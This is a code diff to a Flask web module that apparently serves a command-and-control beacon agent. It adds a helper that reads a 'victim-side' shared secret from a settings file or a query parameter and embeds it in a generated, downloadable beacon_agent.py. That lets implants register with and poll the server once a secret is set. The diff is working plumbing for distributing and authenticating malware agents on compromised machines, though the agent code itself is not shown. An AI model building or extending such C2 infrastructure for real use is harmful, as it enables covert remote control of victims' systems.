@@ -5,6 +5,7 @@ profile, and fetch a server-driven agent that honours ``next_interval_ms``.
 """
 from __future__ import annotations
 
+import json
 import os
 
 from flask import Blueprint, Response, jsonify, request, session
@@ -70,12 +71,28 @@ def api_beacon_config():
                     'profiles': beacon.profiles()})
 
 
+def _ingest_key():
+    """P16: the configured victim-side shared secret, if any.
+
+    The generated agent must carry it or its register/poll POSTs 401 once an
+    ``ingest_secret`` is set.  An explicit ``?k=`` on this request wins.
+    """
+    explicit = (request.args.get('k') or '').strip()
+    if explicit:
+        return explicit
+    try:
+        with open(os.path.join(BASE_DIR, 'Settings.json'), encoding='utf-8') as fh:
+            return (json.load(fh).get('ingest_secret') or '').strip()
+    except Exception:
+        return ''
+
+
 @bp.route('/api/c2/beacon_agent')
 def api_beacon_agent():
     """A drop-in agent that sleeps for the server's ``next_interval_ms``."""
     base = request.args.get('base') or request.host_url.rstrip('/')
     uid = request.args.get('uid') or 'beacon-agent'
-    body = beacon.agent_script(base, uid)
+    body = beacon.agent_script(base, uid, _ingest_key())
     if request.args.get('download'):
         return Response(body, mimetype='text/plain',
                         headers={'Content-Disposition': 'attachment; filename=beacon_agent.py'})
